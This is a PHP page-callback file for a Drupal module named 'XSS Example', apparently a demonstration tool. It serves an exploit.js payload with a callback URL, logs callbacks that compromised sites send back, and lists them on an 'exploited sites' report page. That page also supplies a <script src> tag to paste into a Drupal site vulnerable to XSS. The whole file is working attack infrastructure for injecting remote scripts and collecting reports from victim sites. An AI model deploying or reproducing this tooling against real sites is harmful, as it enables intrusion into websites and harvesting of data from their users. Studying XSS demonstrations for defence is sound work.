<?php
/**
 * @file
 * Page callbacks for the XSS Example module.
 */

/**
 * Page callback for the exploit JavaScript file.
 */
function drupal_xss_example_exploit_page() {
  global $base_url;

  $options = array(
    'callback_url' => url('drupal_xss_example/callback', array('absolute' => TRUE)),
  );
  $options_json = drupal_json_encode($options);
  $javascript_path = drupal_get_path('module', 'drupal_xss_example') . '/exploit.js';

  if (ob_get_level()) {
    ob_end_clean();
  }

  drupal_add_http_header('Content-Type', 'text/javascript');
  drupal_send_headers();

  print "var drupal_xss_example_options = $options_json;\n\n";
  $fd = fopen($javascript_path, 'rt');
  while (!feof($fd)) {
    print fread($fd, 1024);
  }
  fclose($fd);

  drupal_exit();
}

/**
 * Page callback for the scripts callback to master.
 */
function drupal_xss_example_callback_page() {
  $origin = $_GET['origin'];
  $message = $_GET['message'];
  $link = isset($_GET['link']) ? l($_GET['link'], 'visit page') : NULL;

  watchdog('drupal_xss_example', 'Callback from @origin: %message', array('@origin' => $origin, '%message' => $message), WATCHDOG_NOTICE, $link);
}

/**
 * Page callback for the "Exploited sites" callback.
 */
function drupal_xss_example_report_page() {
  $build = array();
  $build['exploit_markup'] = array(
    '#type' => 'textarea',
    '#title' => t('Exploit code'),
    '#value' => '<script src="' . url('drupal_xss_example/exploit.js', array('absolute' => TRUE)) . '"></script>',
    '#description' => t('Paste the above code into an area of the Drupal site which is vulnerable to XSS. A good test is using the "Full HTML" text format.'),
  );

  $query = db_select('watchdog', 'w')->extend('PagerDefault');
  $query
    ->fields('w', array('wid', 'uid', 'severity', 'type', 'timestamp', 'message', 'variables', 'link'))
    ->condition('w.type', 'drupal_xss_example')
    ->orderBy('w.wid', 'desc')
    ->limit(50);
  $result = $query->execute();
  $rows = array();
  foreach ($result as $dblog) {
    $rows[] = array(
      format_date($dblog->timestamp, 'short'),
      theme('dblog_message', array('event' => $dblog, 'link' => FALSE)),
      filter_xss($dblog->link),
    );
  }

  $build['dblog_table'] = array(
    '#theme' => 'table',
    '#header' => array(t('Date'), t('Message'), t('Link')),
    '#rows' => $rows,
    '#empty' => t('No messages from exploited sites.'),
  );
  $build['dblog_pager'] = array('#theme' => 'pager');

  return $build;
}
